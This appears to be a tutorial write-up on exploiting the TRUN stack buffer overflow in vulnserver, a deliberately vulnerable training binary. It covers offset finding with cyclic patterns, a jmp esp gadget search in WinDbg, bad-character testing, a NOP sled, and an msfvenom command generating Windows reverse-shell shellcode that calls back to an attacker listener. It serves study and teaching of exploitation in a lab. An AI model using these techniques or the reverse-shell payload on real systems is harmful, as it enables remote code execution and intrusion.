# Vulnserver-TRUN-ReverseShell

- YOU WILL NEED A LOT OF RESTARTING IN CHALLENGES LIKE THIS. Restarting your binary or VM is completely normal and recommended throughout your journey to code execution.
- The goal of this challenge is to get a reverse shell to our Linux machine as the user running the process (mine is called MALDEV01).
- Requirements for this challenge: a Windows VM with WinDbg (I'll use the old version, but the new one should work fine), and a Linux machine to catch the shell and generate the shellcode.
- This challenge should be approachable for anyone who hasn't done Windows binary exploitation before.
- We will be exploiting the `TRUN .` command, which has no mitigations enabled. Other commands in this binary demonstrate mitigations like SEH or DEP, but we're not covering those here.

# 0x00. Introduction

So, to download vulnserver, hit up this link and grab the binary: https://github.com/stephenbradshaw/vulnserver/blob/master/vulnserver.exe

I'll be going through the source code instead of the reverse engineered binary, just because it's more educational that way. If you want a challenge, try reversing it yourself first and see how far you get.

Once you've downloaded it on your Windows machine, go ahead and run it:

<img width="1147" height="295" alt="image" src="https://github.com/user-attachments/assets/a5766664-fcbd-4718-9ef1-a05bbfdfb0f0" />

Now, assuming you've already got WinDbg, you'll need to attach the process by going to File then Attach to Process. You'll find this in both the old and new versions:

<img width="619" height="324" alt="image" src="https://github.com/user-attachments/assets/39fcb95c-14ad-48df-89b9-40506413ee4b" />

In the newer versions of WinDbg, "vulnserver.exe" shows up near the top of the process list. In mine (the older version), it's near the bottom:

<img width="533" height="562" alt="image" src="https://github.com/user-attachments/assets/8cb1cf5f-c142-4dca-8de3-b28502b82696" />

Hit "Ok". You should now be looking at something like this:

<img width="1306" height="833" alt="image" src="https://github.com/user-attachments/assets/dff886ee-0aac-41ca-a741-7dd62325ccb8" />

You can also throw in disassembly, memory views, and so on, but I'm gonna dive straight into exploitation now.

# 0x01. Smashing the stack!

First thing we need to do is fuzz the offset, basically figure out how many bytes we need to send before we start overwriting EIP (the Instruction Pointer, the 'E' there just means we're talking the 32-bit x86 version of the register).

There's a bunch of ways to find this. I'll use `msf-pattern_create` and `msf-pattern_offset` from my Kali box (pwntools actually has its own version of this built in, called `cyclic()`/`cyclic_find()`, I'll come back to it at the end of this section since it's genuinely worth knowing):

```
msf-pattern_create -l 4000 > exp.py
```

<img width="845" height="754" alt="image" src="https://github.com/user-attachments/assets/bdaae70e-0530-4fe2-92ac-c19800f84416" />

Let's open `exp.py` and get organized. Here's basically what we need to do:

- connect to the target
- create the buffer
- send the buffer
- debug the output

To connect, we'll use pwntools:

```python
from pwn import *

io = remote("192.168.225.159", 9999)
# this is how we connect to the target
```

Where `9999` is the port vulnserver's listening on.

Before we go any further though, we actually need to look at the source: https://github.com/stephenbradshaw/vulnserver/blob/master/vulnserver.c

Here's the `TRUN` handler, around line 204:

```c
} else if (strncmp(RecvBuf, "TRUN ", 5) == 0) {
    char *TrunBuf = malloc(3000);
    memset(TrunBuf, 0, 3000);
    for (i = 5; i < RecvBufLen; i++) {
        if ((char)RecvBuf[i] == '.') {
            strncpy(TrunBuf, RecvBuf, 3000);
            Function3(TrunBuf);
            break;
        }
    }
```

Now, it's really easy to look at this and go "`strncpy(TrunBuf, RecvBuf, 3000)` is the vuln", since `strncpy` has a bit of a reputation. It's actually not. `TrunBuf` is malloc'd on the heap at 3000 bytes, and we're copying at most 3000 bytes into it. That's a correctly sized copy, nothing overflows here.

The actual bug is one function call deeper, inside `Function3`, which is what `TrunBuf` gets handed off to:

```c
void Function3(char *Input) {
    char Buffer2S[2000];
    strcpy(Buffer2S, Input);
}
```

`Buffer2S` is a 2000-byte buffer too, but this time it's on the stack, and `strcpy` just copies `Input` into it with zero length checking. Since `Input` here is our `TrunBuf`, which can be carrying up to 3000 bytes, anything over 2000 bytes after `TRUN .` overflows `Buffer2S` and starts smashing everything above it on the stack, including the saved return address. That's our overflow right there.

So to be clear: it's not the `TRUN` handler's own `strncpy` that's the problem, it's `Function3`'s unchecked `strcpy` into a smaller stack buffer. Worth keeping that straight, because it's also why our crash ends up on the stack and not the heap, which matters for the next bit.

Given all that, here's the plan: send enough bytes to fill `Buffer2S` and reach the saved return address, overwrite that with an address we control, and land on code that's already sitting there on the stack, our shellcode.

Before we get into that, let me explain a couple of things.

**`jmp esp`**: `ESP` is the Stack Pointer register, it's always pointing at whatever's currently on top of the stack. `jmp` just means "jump execution to whatever follows", and what follows here is a register, not a function parameter (parameters are a function-call thing; in raw assembly we're really only dealing with registers and immediates. Worth keeping that distinction straight, because once you start working with other architectures it actually matters, e.g. on x86\_64 the first function parameter lives in RDI, not the stack). So `jmp esp` basically says: start executing whatever's sitting at the current top of the stack.

**NOPs**: `\x90` is the NOP ("no operation") instruction, a single byte that does nothing except bump the instruction pointer forward by one. We use it as padding. Quick clarification on terms here: a *pointer* is just a memory address, nothing more (something like `0x00410041`, on x86 these are a fixed 4 bytes). An *instruction* is the actual data sitting at that address, and instructions can be any length. So NOPs aren't "adjusting a pointer" exactly, what they're doing is giving EIP (the instruction pointer, the special register that keeps auto-incrementing as code runs) somewhere safe to land and slide forward from, one no-op byte at a time.

We need this because `jmp esp` doesn't guarantee we land exactly on byte 0 of our shellcode. ESP's value at the moment of the jump can be a few bytes off from where our shellcode actually starts, just because of how the stack shifts during the crash. A short run of NOPs sitting in front of the shellcode means wherever EIP lands in there, it just slides forward into the real shellcode instead of hitting garbage and crashing.

Alright, let's actually smash the stack. After running:

```
msf-pattern_create -l 4000 > exp.py
```

We'll make a variable to hold it, let's call it `payload`:

<img width="746" height="149" alt="image" src="https://github.com/user-attachments/assets/dc576eab-d41f-4a45-936f-6fa999999175" />

This is wrong though, we need to wrap it in quotes with a `b` prefix first, to say we're sending bytes:

<img width="530" height="142" alt="image" src="https://github.com/user-attachments/assets/90d1d889-65bc-497b-a31d-e3e88d79662e" />

To send it with the right prefix, `TRUN .`, we tweak the code a bit:

```python
payload = b'TRUN .'
payload += b'Aa0......'  # payload += means "add onto" our existing TRUN .Aa0... buffer
```

Now, to actually send this, we use pwntools' `io.sendline`, where `io` is our connection:

```python
io.sendline(payload)
```

Which ends up looking like this:

<img width="658" height="155" alt="image" src="https://github.com/user-attachments/assets/c3ef2f50-89a3-4ee2-a339-d123196edcf4" />

After running `exp.py` (with WinDbg attached, you might need to restart both WinDbg and vulnserver at this point), you should see an access violation:

<img width="656" height="139" alt="image" src="https://github.com/user-attachments/assets/4b918443-e76e-42e0-ac31-f8e8f020e4a8" />

Looking at EIP, you'll see it's holding a value from our pattern. If the output's a bit messy, you can filter down to just that register with `r eip`:

<img width="687" height="145" alt="image" src="https://github.com/user-attachments/assets/04435429-9cba-4841-a691-b000f17c880c" />

Before we go hunting for a gadget though, it's worth actually confirming where our stuff landed. `Buffer2S` lives inside `Function3` as a local array, so it's on the stack, and honestly the crash itself (EIP getting overwritten by bytes from deep in our pattern) is already evidence we smashed something on the stack and not the heap. You can also dump memory around ESP at the moment of the crash (`dd esp`, for example) and literally see your pattern bytes sitting there. This confirms our payload, and whatever we tack on after the return address overwrite, is sitting on the stack and reachable once we redirect execution there. That's really the whole reason we go chasing a `jmp esp` gadget next, instead of some other trick.

We grab the EIP value, head back to Kali, and run `msf-pattern_offset` against it (`396f4338`):

<img width="444" height="117" alt="image" src="https://github.com/user-attachments/assets/b64c6fff-d9fa-405c-bdb7-4da68a8798f7" />

Our offset comes out to 2006. (Quick aside, if you'd used pwntools' `cyclic(4000)` instead of `msf-pattern_create`, you'd find this the exact same way with `cyclic_find(b'<the 4 bytes from EIP>')`, and from then on you can just pad with plain `b'A' * offset` instead of regenerating the whole cyclic pattern each time.)

Now we need a `jmp esp` (or `call esp`) gadget. The classic mistake here is deciding you want `jmp esp` and only then going looking for it, but realistically most targets won't have one conveniently sitting around, and finding good gadgets is genuinely the hardest part of this whole process. Tools like `ropper` and `ROPGadget` exist for exactly this reason, hand-searching doesn't scale. For this binary we can do it manually in WinDbg, but treat that as the easy special case, not the general method.

One more thing before we search though, we're deliberately looking inside `essfunc.dll` (a helper DLL that ships alongside vulnserver) rather than vulnserver's own memory space. That's not an arbitrary choice. Whatever address we use to overwrite EIP has to avoid bad characters (more on that in a sec), and a gadget pulled from the wrong spot could itself contain a bad byte, which would corrupt our overwrite before we even got to the gadget. `essfunc.dll` just happens to load at an address that gives us a clean, bad-char-free 4 bytes, which is why it's the practical pick here, not because vulnserver.exe itself doesn't have a `jmp esp` anywhere.

In the same access violation window, run `lm` ("list modules"):

<img width="530" height="171" alt="image" src="https://github.com/user-attachments/assets/ce674ba1-d51d-418e-bf8c-42d950432338" />

`essfunc.dll` is the one we care about, it's linked into vulnserver and holds some custom ASM functions (source's here if you're curious: https://github.com/stephenbradshaw/vulnserver/blob/master/essfunc.c):

<img width="996" height="700" alt="image" src="https://github.com/user-attachments/assets/66ec3a9a-85e5-4903-9bee-0e8075195da6" />

`jmp esp` in hex is `FF E4`. WinDbg's search syntax looks like this:

```
s -b <start> <end> byte1 byte2 ...
```

`s` means search, `-b` means "search this byte range". `start` and `end` come straight off the module listing above:

<img width="465" height="233" alt="image" src="https://github.com/user-attachments/assets/823cbe40-8c17-4ee3-8aad-1366cd2be303" />

So our full command is:

```
s -b 62500000 62508000 ff e4
```

And we get a bunch of hits:

<img width="684" height="290" alt="image" src="https://github.com/user-attachments/assets/d9b37655-7529-435f-a376-cafceecc4d88" />

Any of these are valid `jmp esp` addresses, grab whichever one you want.

Since our offset is 2006, let's make a variable with 2006 `A`s of padding to reach EIP:

<img width="504" height="241" alt="image" src="https://github.com/user-attachments/assets/760a17fa-b3e2-4dee-b2fe-66e7a086a07c" />

We tack the `jmp esp` address right after the `A`s, since the next 4 bytes after padding land straight in EIP:

<img width="381" height="260" alt="image" src="https://github.com/user-attachments/assets/f8dcc14b-a57b-4cdb-9cbf-84033d2d29d1" />

`p32()` just packs a value into 32 bits (4 bytes), exactly what we need for a 32-bit address.

# 0x02. Bad Characters

Before we send any real shellcode, we've gotta check for bad characters, bytes that'll either corrupt our payload or mess with how it gets parsed off the wire into the vulnerable buffer.

Actually, there's one we already know is bad before we've tested anything: `\x00`. The `TRUN` handling code walks through `RecvBuf` hunting for a literal `.` character, and treats the whole buffer as a C-string the entire way (`strncmp`, `strcpy`, etc. all stop dead at the first null byte). So any `\x00` in our shellcode would just truncate the copy right there, that's predictable going in, not something we need to discover by trial and error, and it's basically true of any C code relying on null-terminated string functions. Other usual suspects are things like `\x0a` (`\n`, line feed) and `\x0d` (`\r`, carriage return), since line-oriented network handling can mangle those, but the exact set really depends on the protocol and code path, so testing is still worth doing to catch anything the static reasoning misses.

One more thing on bad chars before we move on, don't just scan your shellcode for them. The `jmp esp` address we're hardcoding into the payload is just as much a part of the payload bytes as anything else, and if that 4-byte address happened to contain a bad character, our overwrite would get mangled before execution even reached the gadget. That's actually part of why we picked a gadget out of `essfunc.dll` specifically, like I mentioned above.

To actually test this, add the following to your script:

```
badchar = b"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
```

I add this right after the `jmp esp` gadget:

<img width="810" height="241" alt="image" src="https://github.com/user-attachments/assets/0ccceddd-60ac-4237-9423-47399561052c" />

Running it with vulnserver and WinDbg attached:

<img width="1700" height="619" alt="image" src="https://github.com/user-attachments/assets/9698042a-af49-4a5f-ba49-e89388d3f33f" />

You can see it starts at `00` and then jumps straight to `48`, confirming `\x00` got eaten, exactly like we figured it would.

To double check, let's rerun without `\x00` in the test buffer:

```
badchar = b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
```

<img width="712" height="276" alt="image" src="https://github.com/user-attachments/assets/77b36d64-8c2f-4404-b4a8-40e50223e288" />

Restart vulnserver and WinDbg, run the PoC again, and we should see every byte from `\x01` through `\xff` come through intact:

<img width="1636" height="714" alt="image" src="https://github.com/user-attachments/assets/2043c4a5-1a31-478a-8d45-255fa8c0ce5a" />

Yep, everything from `\x01` to `\xff` shows up, confirming `\x00` was our one and only bad character.

If you can't see the memory, head here:

<img width="874" height="446" alt="image" src="https://github.com/user-attachments/assets/f4ba5764-f2c2-4109-a989-a8f0975e367e" />

And hit Enter. Or just delete whatever's in the expression box and type `@eip`:

<img width="1089" height="352" alt="image" src="https://github.com/user-attachments/assets/cc473824-b152-4de1-9a46-0c40f6cda683" />

(We use `@eip` since that's the register we overwrote.)

# 0x03. Jumping to shellcode!

Now we need shellcode for the reverse shell, generated with `msfvenom`:

```
msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=192.168.225.128 LPORT=4444 -b \x00 -e x86/shikata_ga_nai -f python
```

`-b` excludes bad characters, since we confirmed `\x00` is the only one, msfvenom generates shellcode that avoids it. `LHOST`/`LPORT` are your Linux listener's IP and port:

<img width="698" height="661" alt="image" src="https://github.com/user-attachments/assets/f4630672-0230-4de5-bb1c-d1f2ffe6e20e" />

Add it to the script, right after the `jmp esp` address:

<img width="551" height="628" alt="image" src="https://github.com/user-attachments/assets/6a853e1c-f4e7-4730-8f1b-d7bd2462b200" />

We're almost ready, but as covered above, landing exactly on byte 0 of the shellcode via `jmp esp` isn't guaranteed. So we add a NOP sled between the gadget address and the shellcode, not after jumping, but physically positioned right after the gadget address and before the shellcode in the payload, so that wherever EIP actually lands within it, execution slides forward into the real shellcode. There's no fixed number that always works, but 16 or more NOPs is reliable in most cases.

Let's add it and try:

<img width="536" height="735" alt="image" src="https://github.com/user-attachments/assets/daa82797-0a5e-4fd1-8ef1-9673ef414bd0" />

Make sure to use `io.send(payload)`, not `sendline`.

Running the exploit gets us a shell as `maldev01`!

<img width="937" height="425" alt="image" src="https://github.com/user-attachments/assets/2edbb45a-e5b5-4a4a-a547-db5d0e0b50af" />

# 0x04. NOPs don't matter (within reason)

Back to the NOP sled: we used 16 here. Making it 30 or 40 doesn't change the outcome, let's try 40:

<img width="1499" height="833" alt="image" src="https://github.com/user-attachments/assets/f729710b-074c-41e5-b996-3ed31e414c75" />

Even 100 NOPs works just as well:

<img width="1411" height="394" alt="image" src="https://github.com/user-attachments/assets/89638358-a9bb-49f4-b211-02269fd42e9b" />

(There are practical upper limits, eventually you start eating into space needed for other parts of the payload or buffer, but within the range used here it makes no difference.)

Hopefully this was clear. If you have recommendations or corrections, feel free to reach out.

Until next time!
